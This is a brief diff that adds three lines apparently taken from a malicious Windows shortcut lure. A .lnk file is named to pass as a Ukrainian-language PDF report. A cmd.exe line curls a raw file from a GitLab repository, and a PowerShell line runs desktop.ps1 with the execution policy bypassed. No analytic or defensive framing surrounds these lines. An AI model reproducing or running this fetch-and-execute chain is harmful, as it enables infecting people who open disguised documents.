@@ -1,0 +1,3 @@
+Аналітичний_звіт_Наталії.pdf.lnk
+cmd.exe /c curl https://gitlab.com/galata20/shiba/-/raw/main/first.ini
+powershell -ep bypass -f desktop.ps1
